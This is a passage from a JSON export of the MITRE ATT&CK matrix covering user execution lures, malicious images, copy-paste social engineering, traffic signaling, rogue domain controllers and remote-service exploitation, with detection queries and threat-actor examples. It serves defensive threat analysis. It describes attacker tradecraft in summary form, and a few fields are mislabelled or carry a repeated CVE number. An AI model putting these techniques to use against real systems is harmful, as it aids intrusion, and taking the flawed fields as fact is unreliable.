      "BlackTechhas used e-mails with malicious documents to lure victims into installing malware.[44][45]",
      "BLINDINGCANhas lured victims into executing malicious macros embedded within Microsoft Office documents.[46]",
      "BoomBoxhas gained execution through user interaction with a malicious file.[47]",
      "BRONZE BUTLERhas attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.[48][49]",
      "Brute Ratel C4has gained execution through users opening malicious documents.[50]",
      "Bumblebeehas relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs.[51][52][53][54]",
      "Bundlorehas attempted to get users to execute a malicious .app file that looks like a Flash Player update.[55]",
      "DuringC0011,Transparent Triberelied on a student target to open a malicious document delivered via email.[56]",
      "DuringC0015, the threat actors relied on users to enable macros within a malicious Microsoft Word document.[57]",
      "Cardinal RATlures victims into executing malicious macros embedded within Microsoft Excel documents.[58]",
      "CARROTBALLhas been executed through users being lured into opening malicious e-mail attachments.[59]",
      "Chaesrequires the user to click on the malicious Word document to execute the next part of the attack.[60]",
      "Clamblinghas gained execution through luring victims into opening malicious files.[61]",
      "Cobalt Grouphas sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.[62][63]",
      "Confuciushas lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.[64]",
      "CSPY Downloaderhas been delivered via malicious documents with embedded macros.[65]",
      "CURIUMhas lured users into opening malicious files delivered via social media.[66]",
      "DanBothas relied on victims' opening a malicious file for initial execution.[67][68]",
      "Dark Caracalmakes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.[69]",
      "DarkGateinitial infection payloads can masquerade as pirated media content requiring user interaction for code execution.[70]DarkGateis distributed through phishing links to VBS or MSI objects requiring user interaction for execution.[71]",
      "Darkhotelhas sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.[72][73]",
      "DarkHydrushas sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.[74][75]",
      "DarkTortillahas relied on a user to open a malicious document or archived file delivered via email for initial execution.[76]",
      "Discohas been executed through inducing user interaction with malicious .zip and .msi files.[77]",
      "DnsSystemhas lured victims into opening macro-enabled Word documents for execution.[78]",
      "Dragonflyhas used various forms of spearphishing in attempts to get users to open malicious attachments.[79]",
      "Dridexhas relied upon users clicking on a malicious attachment delivered through spearphishing.[80]",
      "Earth Luscarequired users to click on a malicious file for the loader to activate.[81]",
      "Elderwoodhas leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.[82][83]",
      "Emotethas relied upon users clicking on a malicious attachment delivered through spearphishing.[84][85][86]",
      "EnvyScouthas been executed through malicious files attached to e-mails.[47]",
      "EXOTIC LILYhas gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO.[87][51]",
      "Ferocious Kittenhas attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.[88]",
      "FIN4has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).[89][90]",
      "FIN6has used malicious documents to lure victims into allowing execution of PowerShell scripts.[91]",
      "FIN7lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.[92][93][94]",
      "FIN8has used malicious e-mail attachments to lure victims into executing malware.[95][96][97]",
      "Flagprohas relied on users clicking a malicious attachment delivered through spearphishing.[45]",
      "DuringFrankenstein, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.[98]",
      "Gallmakersent victims a lure document with a warning that asked victims to \"enable content\" for execution.[99]",
      "Gamaredon Grouphas attempted to get users to click on Office attachments with malicious macros embedded.[100][101][102][103][104][105][106][107]",
      "Gorgon Groupattempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.[108]",
      "Grandoreirohas infected victims via malicious attachments.[109]",
      "TheGuLoaderexecutable has been retrieved via embedded macros in malicious Word documents.[110]",
      "Hancitorhas used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros.[111]",
      "HEXANEhas relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware.[67][112][68][78]",
      "Heyoka Backdoorhas been spread through malicious document lures.[7]",
      "Higaisaused malicious e-mail attachments to lure victims into executing LNK files.[113][114]",
      "IcedIDhas been executed through Word and Excel files with malicious embedded macros and through ISO and LNK files that execute the malicious DLL.[115][116][117]",
      "Inceptionlured victims into clicking malicious files for machine reconnaissance and to execute malware.[118][119][120][121]",
      "IndigoZebrasent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.[122]",
      "Indrik Spiderhas attempted to get users to click on a malicious zipped file.[123]",
      "InvisiMolecan deliver trojanized versions of software and documents, relying on user execution.[124]",
      "Javalihas achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript.[34]",
      "JCryhas achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer.[125]",
      "JSS Loaderhas been executed through malicious attachments contained in spearphishing emails.[93]",
      "Kerrdownhas gained execution through victims opening malicious files.[25][126]",
      "KGH_SPYhas been spread through Word documents containing malicious macros.[65]",
      "Kimsukyhas used attempted to lure victims into opening malicious e-mail attachments.[127][128][129][65][9][130]",
      "KOCTOPUShas relied on victims clicking a malicious document for execution.[131]",
      "KONNIhas relied on a victim to enable malicious macros within an attachment delivered via email.[132]",
      "KOPILUWAKhas gained execution through malicious attachments.[133]",
      "Latrodectushas lured users into opening malicious email attachments for execution.[134]",
      "Lazarus Grouphas attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.[135][136][137][138]",
      "LazyScripterhas lured users to open malicious email attachments.[131]",
      "Leviathanhas sent spearphishing attachments attempting to get a user to click.[139][140]",
      "Lokibothas tricked recipients into enabling malicious macros by getting victims to click \"enable content\" in email attachments.[141][142]",
      "Lumma Stealerhas gained initial execution through victims opening malicious executable files embedded in zip archives, and MSI files within RAR files.[143]",
      "LunarMailhas been installed through a malicious macro in a Microsoft Word document.[144]",
      "Machetehas relied on users opening malicious attachments delivered through spearphishing to execute malware.[145][146][147][148]",
      "Magic Houndhas attempted to lure victims into opening malicious email attachments.[149]",
      "Malteirohas relied on users to execute .zip file attachments containing malicious URLs.[150]",
      "Mangohas been executed through a Microsoft Word document with a malicious macro.[151]",
      "menuPasshas attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.[152][153][154][155][156]",
      "Metamorforequires the user to double-click the executable to run the malicious HTA file or to download a malicious installer.[157][158]",
      "Mispaduhas relied on users to execute malicious files in order to gain execution on victim machines.[159][160][150]",
      "Mofang's malicious spearphishing attachments required a user to open the file after receiving.[161]",
      "Moleratshas sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.[162][163][164]",
      "Mongallhas relied on a user opening a malicious document for execution.[7]",
      "Moonstone Sleetrelied on users interacting with malicious files, such as a trojanized PuTTY installer, for initial execution.[165]",
      "MuddyWaterhas attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.[166][167][168][169][170][171][172][173][174][175][176]",
      "Mustang Pandahas sent malicious files requiring direct victim interaction to execute.[177][178][179][180][181][182]",
      "Naikonhas convinced victims to open malicious attachments to execute malware.[183]",
      "NativeZonecan display an RTF document to the user  to enable execution ofCobalt Strikestage shellcode.[47]",
      "NETWIREhas been executed through luring victims into opening malicious documents.[184][110][185]",
      "Ninjahas gained execution through victims opening malicious executable files embedded in zip archives.[186]",
      "Nomadic Octopusas attempted to lure victims into clicking on malicious attachments within spearphishing emails.[187][188]",
      "Octopushas relied upon users clicking on a malicious attachment delivered through spearphishing.[188]",
      "OilRighas delivered macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.[189][190][191][192][193]",
      "DuringOperation Dream Job,Lazarus Grouplured victims into executing malicious documents that contained \"dream job\" descriptions from defense, aerospace, and other sectors.[194][195]",
      "DuringOperation Dust Storm, the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.[196]",
      "DuringOperation Honeybee, threat actors relied on a victim to enable macros within a malicious Word document.[197]",
      "DuringOperation Sharpshooter, the threat actors relied on victims executing malicious Microsoft Word or PDF files.[198]",
      "DuringOperation Spalax, the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware.[199]",
      "OSX/Shlayerhas relied on users mounting and executing a malicious DMG file.[200][201]",
      "OutSteelhas relied on a user to execute a malicious attachment delivered via spearphishing.[202]",
      "Patchworkembedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.[203][204]",
      "PLATINUMhas attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.[205]",
      "PLEADhas been executed via malicious e-mail attachments.[44]",
      "PoetRAThas used spearphishing attachments to infect victims.[206]",
      "Ponyhas attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format).[207]",
      "PROMETHIUMhas attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.[208][209]",
      "QakBothas gained execution through users opening malicious attachments.[210][211][212][213][214][215][216][217][218][219]",
      "Ramsayhas been executed through malicious e-mail attachments.[220]",
      "Rancorattempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.[221]",
      "RedCurlhas used malicious files to infect the victim machines.[222][223][224]",
      "Mustang Pandadistributed malicious LNK objects for user execution duringRedDelta Modified PlugX Infection Chain Operations.[225]",
      "REvilhas been executed via malicious MS Word e-mail attachments.[226][227][228]",
      "Rifdoorhas been executed from malicious Excel or Word documents containing macros.[229]",
      "ROKRAThas relied upon users clicking on a malicious attachment delivered through spearphishing.[230]",
      "RTMhas relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within.[231]",
      "RTMhas attempted to lure victims into opening e-mail attachments to execute malicious code.[232]",
      "Saint Bearrelies on user interaction and execution of malicious attachments and similar for initial execution on victim systems.[202]",
      "Saint Bothas relied on users to execute a malicious attachment delivered via spearphishing.[233][202]",
      "Sandworm Teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.[234][235]",
      "SideCopyhas attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.[236]",
      "Sidewinderhas lured targets to click on malicious files to gain execution in the target environment.[237][238][239][240]",
      "Silenceattempts to get users to launch malicious attachments delivered via spearphishing emails.[241][242][243]",
      "Snip3can gain execution through the download of visual basic files.[244][245]",
      "SQLRatrelies on users clicking on an embedded image to execute the scripts.[246]",
      "Squirrelwafflehas relied on users enabling malicious macros within Microsoft Excel and Word attachments.[247][248]",
      "Star Blizzardhas lured targets into opening malicious .pdf files to deliver malware.[249]",
      "STARWHALEhas relied on victims opening a malicious Excel file for execution.[174]",
      "Storm-1811has prompted users to execute downloaded software and payloads as the result of social engineering activity.[250][251][252]",
      "StrelaStealerrelies on user execution of a malicious file for installation.[253]",
      "StrongPityhas been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.[208][209]",
      "SomeSUGARDUMPvariants required a user to enable a macro within a malicious .xls file for execution.[254]",
      "SVCReadyhas relied on users clicking a malicious attachment delivered through spearphishing.[255]",
      "SYSCONhas been executed by luring victims to open malicious e-mail attachments.[256]",
      "TA2541has used macro-enabled MS Word documents to lure victims into executing malicious payloads.[257][258][245]",
      "TA459has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.[259]",
      "TA505has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example,TA505makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files.[260][261][262][263][264][265][266][267][268]",
      "TA551has prompted users to enable macros within spearphishing attachments to install malware.[269]",
      "Taidoorhas relied upon a victim to click on a malicious email attachment.[270]",
      "The White Companyhas used phishing lure documents that trick users into opening them and infecting their computers.[271]",
      "Threat Group-3390has lured victims into opening malicious files containing malware.[61]",
      "ThreatNeedlerelies on a victim to click on a malicious document for initial execution.[136]",
      "Tonto Teamhas relied on user interaction to open their malicious RTF documents.[272][39]",
      "Transparent Tribehas used weaponized documents in e-mail to compromise targeted systems.[273][274][275][276][277]",
      "TrickBothas attempted to get users to launch malicious documents to deliver its payload.[278][279]",
      "Tropic Trooperhas lured victims into executing malware via malicious e-mail attachments.[280]",
      "A Word document deliveringTYPEFRAMEprompts the user to enable macro execution.[281]",
      "Valakhas been executed via Microsoft Word documents containing malicious macros.[282][283][284]",
      "WarzoneRAThas relied on a victim to open a malicious attachment within an email for execution.[285][64]",
      "Water Curupira Pikabot DistributiondeliveredPikabotinstallers as password-protected ZIP files containing heavily obfuscated JavaScript, or IMG files containing an LNK mimicking a Word document and a malicious DLL.[286]",
      "Whiteflyhas used malicious .exe or .dll files disguised as documents or images.[287]",
      "Windshifthas used e-mail attachments to lure victims into executing malicious code.[288]",
      "WIRTEhas attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.[289]",
      "Wizard Spiderhas lured victims to execute malware with spearphishing attachments containing macros to download eitherEmotet, Bokbot,TrickBot, orBazar.[290][291][292]",
      "Woody RAThas relied on users opening a malicious email attachment for execution.[293]",
      "ZxxZhas relied on victims to open a malicious attachment delivered via email.[40]"
    ]
  },
  "T1204.003": {
    "Name": "User Execution:Malicious Image",
    "Description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository viaUpload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.[1]Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex:Match Legitimate Resource Name or Location).[2]",
    "Detects": [
      "Monitor logs from cloud platforms like AWS, GCP, or Azure to detect anomalies related to container or image execution. Look for unusual patterns or log events that deviate from typical behavior.Analytic 1 - Unusual application logs indicating image execution anomalies.sourcetype=application_log EventCode=1000 OR EventCode=1001| search log_level=ERROR OR log_level=WARNING OR message IN (\"failed to pull image\", \"container crash\", \"unauthorized access\")",
      "Monitor for suspicious commands related to image or container manipulation, especially commands run from users not typically associated with these tasks.Analytic 1 - Unexpected command execution related to image files.sourcetype=command_execution| search command IN (\"docker pull\", \"docker run\", \"docker exec\", \"kubectl run\", \"gcloud container images list-tags\", \"aws ec2 run-instances\")",
      "Track the deployment of new containers, especially from newly built images.",
      "Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images.",
      "Monitor the local image registry to make sure malicious images are not added.",
      "Monitor for newly constructed instances that may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior.",
      "Monitor for the activation or invocation of an instance (ex: instance.start within GCP Audit Logs)"
    ],
    "Procedure Examples": [
      "TeamTNThas relied on users to download and execute malicious Docker images.[3]"
    ]
  },
  "T1204.004": {
    "Name": "User Execution:Malicious Copy and Paste",
    "Description": "An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into aCommand and Scripting Interpreter.Malicious websites, such as those used inDrive-by Compromise, may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.[1][2][3][4]Adversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.[5][6]Tricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.",
    "Detects": [
      "Detect commands triggered by users that may download malicious files. Items typed into the Windows Run dialog are saved for each user in theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRURegistry key.[8]",
      "Monitor for files created on a system after a user executes an unusual command. Look for common download paths and suspicious files with executable extensions.",
      "Monitor network traffic patterns associated with user actions, such as initiating connections to suspicious sites.",
      "Monitor and analyze traffic patterns and packet inspection associated with web-based network connections that are sent to malicious or suspicious destinations (e.g. destinations attributed to malicious actors). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments.",
      "Identify processes spawned by user actions that could lead to malicious execution."
    ],
    "Procedure Examples": [
      "Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g.,Add-Type).[7]",
      "If a link is being requested by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.",
      "If a link is being requested by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as.scr,.exe,.pif,.cpl, etc."
    ]
  },
  "T1205": {
    "Name": "Traffic Signaling",
    "Description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enableNetwork Device Authenticationfor standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]To enable this traffic signaling on embedded devices, adversaries must first achieve and leveragePatch System Imagedue to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze network packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, protocol port mismatch, anomalous syntax, or structure). Consider packet inspection for Wake-on-LAN magic packet consists of 6 bytes ofFFfollowed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.[20]",
      "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpcted hardware devices, or other uncommon data flows.",
      "Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.[21]"
    ],
    "Procedure Examples": [
      "BUSHWALKcan modify theDSUserAgentCap.pmPerl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests.[7]",
      "Chaosprovides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.[8]",
      "DuringCutting Edge, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the/tmp/clientsDownload.socksocket.[7]",
      "J-magiccan monitor TCP traffic for packets containing one of five different predefined parameters and will spawn a reverse shell if one of the parameters and the proper response string to a subsequent challenge is received.[9]",
      "Kimsukyhas usedTRANSLATEXTto redirect clients to legitimate Gmail, Naver or Kakao pages if the clients connect with no parameters.[10]",
      "Kobalosis triggered by an incoming TCP connection to a legitimate service from a specific source port.[11][12]",
      "Pandoracan identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.[13]",
      "Penquinwill connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions.[14][15]",
      "Ryukhas used Wake-on-Lan to power on turned off systems for lateral movement.[5]",
      "SYNful Knockcan be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.[3]",
      "TRANSLATEXThas redirected clients to legitimate Gmail, Naver or Kakao pages if the clients connect with no parameters.[10]",
      "Umbreonprovides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.[16]",
      "Uroburoscan intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specificUroburosimplant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.[17]",
      "Winnti for Linuxhas used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.[18]",
      "ZIPLINEcan identify a specific string in intercepted network traffic,SSH-2.0-OpenSSH_0.3xx., to trigger its command functionality.[19]"
    ]
  },
  "T1205.001": {
    "Name": "Traffic Signaling:Port Knocking",
    "Description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpcted hardware devices, or other uncommon data flows."
    ],
    "Procedure Examples": [
      "cd00rcan monitor for a single TCP-SYN packet to be sent in series to a configurable set of ports (200, 80, 22, 53 and 3 in the original code) before opening a port for communication.[1][2]",
      "Mafaldacan use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.[3][4]",
      "metaMainhas authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure.[3]",
      "PROMETHIUMhas used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.[5]"
    ]
  },
  "T1205.002": {
    "Name": "Traffic Signaling:Socket Filters",
    "Description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as thelibpcaplibrary to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.[1]Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction withProtocol Tunneling.[2][3]Filters can be installed on any Unix-like platform withlibpcapinstalled or on Windows hosts usingWinpcap.  Adversaries may use eitherlibpcapwithpcap_setfilteror the standard library functionsetsockoptwithSO_ATTACH_FILTERoptions. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "Detects": [
      "Monitor recently started applications creating raw socket connections.[7]",
      "Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.[7]"
    ],
    "Procedure Examples": [
      "BPFDooruses BPF bytecode to attach a filter to a network socket to view ICMP, UDP, or TCP packets coming through ports 22 (ssh), 80 (http), and 443 (https). WhenBPFDoorfinds a packet containing its \"magic\" bytes, it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields.[4][5]",
      "Penquininstalls aTCPandUDPfilter on theeth0interface.[3]",
      "PITSTOPcan listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at/data/runtime/cockpit/wd.fdfor a predefined magic byte sequence.PITSTOPcan then duplicate the socket for further communication over TLS.[6]"
    ]
  },
  "T1207": {
    "Name": "Rogue Domain Controller",
    "Description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.[1]Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.[2]This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).[1]The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to performSID-History Injectionand/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.[1]",
    "Detects": [
      "Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects.[1]",
      "Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies.[4][5]Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929).[1]",
      "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts.[6][1]DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords).",
      "Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with \"GC/\") by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging.[5]A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete."
    ],
    "Procedure Examples": [
      "Mimikatz’sLSADUMP::DCShadowmodule can be used to make AD updates by temporarily setting a computer to be a DC.[3][2]"
    ]
  },
  "T1210": {
    "Name": "Exploitation of Remote Services",
    "Description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done throughNetwork Service Discoveryor other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB[1]and RDP[2]as well as applications that may be used within internal networks such as MySQL[3]and web server services.[4][5]Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.[6]Depending on the permissions level of the vulnerable remote service an adversary may achieveExploitation for Privilege Escalationas a result of lateral movement exploitation as well.",
    "Detects": [
      "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Web Application Firewalls may detect improper inputs attempting exploitation.sourcetype=\"WinEventLog:System\" (EventCode=7031 OR EventCode=1000) OR sourcetype=\"linux:syslog\" OR sourcetype=\"macos:system\"| search Message=\"service terminated unexpectedly\" OR Message=\"segmentation fault\" OR Message=\"service restart\"| stats count by Host, ServiceName, Message, _time| eval exploitation_suspicious=if(count > threshold OR match(Message, \"segmentation fault|service terminated unexpectedly\"), \"suspicious\", \"normal\")| where exploitation_suspicious=\"suspicious\"| table _time, Host, ServiceName, Message, exploitation_suspicious",
      "Use deep packet inspection to look for artifacts of common exploit traffic, such as known payloads.sourcetype=\"network:packet_capture\" OR sourcetype=\"ids:alert\"| search (alert IN (\"SMB Exploit Detected\", \"RDP Exploit Attempt\", \"MySQL Exploit Attempt\")) OR (src_port IN (445, 3389, 3306))| stats count by src_ip, dest_ip, dest_port, protocol, signature, _time| eval anomaly_detected=if(count > threshold OR match(signature, \"Exploit Attempt|Remote Code Execution\"), \"suspicious\", \"normal\")| where anomaly_detected=\"suspicious\"| table _time, src_ip, dest_ip, dest_port, protocol, signature, anomaly_detected"
    ],
    "Procedure Examples": [
      "APT28exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.[7][8][9]",
      "Bad Rabbitused the EternalRomance SMB exploit to spread through victim networks.[10]",
      "Confickerexploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.[11]",
      "Dragonflyhas exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.[12]",
      "Earth Luscahas usedMimikatzto exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).[13]",
      "Ember Bearhas used exploits for vulnerabilities such as MS17-010, also known asEternal Blue, during operations.[14]",
      "Emotethas been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.[15][16][17][18]",
      "Empirehas a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.[19]",
      "FIN7has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.[20]",
      "Flamecan use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.[21][22]",
      "Fox Kittenhas exploited known vulnerabilities in remote services including RDP.[23][24][25]",
      "InvisiMolecan spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.[26]",
      "Lucifercan exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).[27]",
      "menuPasshas used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).[28]",
      "MuddyWaterhas exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).[29]",
      "NotPetyacan use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.[30][31][32]",
